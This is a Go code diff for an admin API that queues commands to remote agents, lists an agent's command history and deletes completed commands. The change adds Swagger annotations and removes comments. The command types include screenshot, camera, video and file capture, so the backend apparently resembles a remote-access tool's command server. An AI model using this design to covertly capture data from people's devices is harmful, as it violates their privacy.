@@ -24,9 +24,21 @@ var commandExtensionMap = map[string]string{
 	"screenshot": ".png",
 	"camera":     ".jpg",
 	"video":      ".mp4",
-	"get_file":   ".zip", // fallback general file fetch
+	"get_file":   ".zip",
 }
 
+// SendCommand godoc
+// @Summary Send a command to an agent
+// @Description Queue a command to be executed by the specified agent
+// @Tags admin
+// @Accept json
+// @Produce json
+// @Param agent_id path string true "Agent ID"
+// @Param command body CommandRequest true "Command payload"
+// @Success 200 {object} map[string]string
+// @Failure 400 {string} string "Invalid input"
+// @Failure 500 {string} string "Failed to send command"
+// @Router /admin/command/{agent_id}/send [post]
 func SendCommand(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	agentID := vars["agent_id"]
@@ -39,12 +51,11 @@ func SendCommand(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Tentukan ekstensi berdasarkan command (jika perlu)
 	command := strings.ToLower(req.Command)
 	ext, ok := commandExtensionMap[command]
 	if !ok {
 		utils.LogWarning("Unknown command type sent: " + command)
-		ext = "" // tetap kirim, tapi tanpa ekspektasi file
+		ext = ""
 	}
 
 	db := database.Connect()
@@ -52,8 +63,8 @@ func SendCommand(w http.ResponseWriter, r *http.Request) {
 
 	_, err = db.Exec(`
 		INSERT INTO commands (agent_id, command, status, created_at)
-		VALUES (?, ?, 'pending', ?)
-	`, agentID, req.Command, time.Now())
+		VALUES (?, ?, 'pending', ?)`,
+		agentID, req.Command, time.Now())
 	if err != nil {
 		utils.LogError("Failed to insert command: " + err.Error())
 		http.Error(w, "Failed to send command", http.StatusInternalServerError)
@@ -68,6 +79,15 @@ func SendCommand(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
+// GetCommandsByAgent godoc
+// @Summary Get all commands for an agent
+// @Description Retrieve command history for a given agent ID
+// @Tags admin
+// @Produce json
+// @Param agent_id path string true "Agent ID"
+// @Success 200 {array} map[string]interface{}
+// @Failure 500 {string} string "Failed to get commands"
+// @Router /admin/command/{agent_id} [get]
 func GetCommandsByAgent(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	agentID := vars["agent_id"]
@@ -79,8 +99,7 @@ func GetCommandsByAgent(w http.ResponseWriter, r *http.Request) {
 		SELECT id, agent_id, command, status, result, created_at, executed_at
 		FROM commands
 		WHERE agent_id = ?
-		ORDER BY created_at DESC
-	`, agentID)
+		ORDER BY created_at DESC`, agentID)
 
 	if err != nil {
 		utils.LogError("Failed to query commands: " + err.Error())
@@ -108,9 +127,9 @@ func GetCommandsByAgent(w http.ResponseWriter, r *http.Request) {
 			"agent_id":    agent,
 			"command":     cmdText,
 			"status":      status,
-			"result":      "", // default
+			"result":      "",
 			"created_at":  createdAt,
-			"executed_at": "", // default
+			"executed_at": "",
 		}
 
 		if result.Valid {
@@ -127,16 +146,24 @@ func GetCommandsByAgent(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(commands)
 }
 
-// DeleteCommand will remove the command if its status is 'completed' and has a result.
+// DeleteCommand godoc
+// @Summary Delete a completed command with result
+// @Description Remove a command entry if it is completed and has result
+// @Tags admin
+// @Produce plain
+// @Param id path string true "Command ID"
+// @Success 200 {string} string "Command deleted successfully"
+// @Failure 400 {string} string "Command cannot be deleted"
+// @Failure 404 {string} string "Command not found"
+// @Failure 500 {string} string "Failed to delete command"
+// @Router /admin/command/{id} [delete]
 func DeleteCommand(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	commandID := vars["id"]
 
-	// Connect to the database
 	db := database.Connect()
 	defer db.Close()
 
-	// Check if the command exists and is 'completed' with a result
 	var status, result string
 	err := db.QueryRow(`
 		SELECT status, result FROM commands WHERE id = ?`, commandID).Scan(&status, &result)
@@ -146,14 +173,12 @@ func DeleteCommand(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Only allow deletion if the command is 'completed' and has a result
 	if status != "completed" || result == "" {
 		utils.LogWarning("Command cannot be deleted, invalid status or no result: " + commandID)
 		http.Error(w, "Command cannot be deleted", http.StatusBadRequest)
 		return
 	}
 
-	// Delete the command from the database
 	_, err = db.Exec(`DELETE FROM commands WHERE id = ?`, commandID)
 	if err != nil {
 		utils.LogError("Failed to delete command: " + err.Error())
